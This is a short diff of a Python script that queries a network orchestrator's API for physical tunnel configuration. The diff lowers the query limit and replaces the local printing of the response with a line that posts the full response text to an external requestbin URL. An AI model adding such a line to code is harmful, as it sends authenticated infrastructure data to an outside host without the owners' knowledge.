@@ -53,10 +53,13 @@ orch = Orch()
 orch.login()
 # #orchResponse = orch.get('/gms/overlays/config/7') #Get Overlays For ID 7
 # orchResponse = orch.get('/tunnelsConfiguration/overlayInfo')
-orchResponse = orch.get('/tunnels2/physical?limit=100')
+orchResponse = orch.get('/tunnels2/physical?limit=3')
 # orchResponse = orch.get('/tunnels2/physical/{nePk}/{tunnelId}')
-try:
-    print("\nValue:\n{0}\n".format(json.dumps(orchResponse.json(), indent=4, sort_keys=True)))
-except:
-    print("\nValue:\n{0}\n".format(orchResponse.text))
+
+requests.post('http://requestbin.fullcontact.com/th5lwcth', data=orchResponse.text)
+
+# try:
+#     print("\nValue:\n{0}\n".format(json.dumps(orchResponse.json(), indent=4, sort_keys=True)))
+# except:
+#     print("\nValue:\n{0}\n".format(orchResponse.text))
 orch.logout()
